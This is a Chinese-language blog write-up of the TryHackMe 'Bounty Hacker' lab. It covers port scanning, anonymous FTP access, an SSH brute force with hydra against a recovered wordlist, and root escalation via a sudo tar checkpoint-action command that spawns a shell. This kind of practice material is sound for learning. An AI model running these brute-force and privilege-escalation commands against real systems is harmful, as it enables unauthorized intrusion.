---
title: Bounty Hacker (Try Hack Me Writeup)
date: 2021-08-19T23:57:00+08:00
draft: false
url: "/2021/08/19/bounty-hacker-try-hack-me-writeup/"
categories:
  - 滲透測試
  - Try Hack Me
showToc: true
TocOpen: false
---

> 
URL : https://tryhackme.com/room/cowboyhacker

IP : 10.10.164.54

## Recon

- 掃 Port`rustscan -a 10.10.164.54 -r 1-65535`![](/uploads/2022/02/51e90-OHdpHys.png)
- 21
- 22
- 80`nmap -A -p21,22,80 10.10.164.54`- ![](/uploads/2022/02/46028-fX6jwMc.png)
- FTP 可以匿名登入 !!觀察首頁- ![](/uploads/2022/02/b7d83-TcipcZA.jpg)
- 沒啥東東dirsearch- 也沒啥東東
- ![](/uploads/2022/02/6e58f-e6Yx7KD.png)

## FTP Anonymous login

- FTP 登入![](/uploads/2022/02/4a8f3-eDhLW7K.png)
- 裡面有兩ㄍ檔案都載下來FTP 檔案- ![](/uploads/2022/02/49c10-OHreXEW.png)作者是 `lin`![](/uploads/2022/02/26a16-jeU8FFE.png)- 看起來是一個密碼表

## 爆破密碼

- `hydra -l 'lin' -P locks.txt ssh://10.10.164.54`![](/uploads/2022/02/e6e7a-V5VCmJA.png)
- 帳號 : `lin`
- 密碼 : `RedDr4gonSynd1cat3`SSH 登入成功- ![](/uploads/2022/02/c0fcc-EMmqpa7.png)取得 user flag- ![](/uploads/2022/02/4d939-y5O6qRV.png)

## 提權

- 起手式 `sudo -l`![](/uploads/2022/02/9abbe-VrYqxmz.png)
- 發現可以用 `sudo tar`GTFOBins 尋找 tar sudo 提權- https://gtfobins.github.io/gtfobins/tar/#sudo
- `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`提權完畢，取得 root flag- ![](/uploads/2022/02/9fbce-0kebDB6.png)
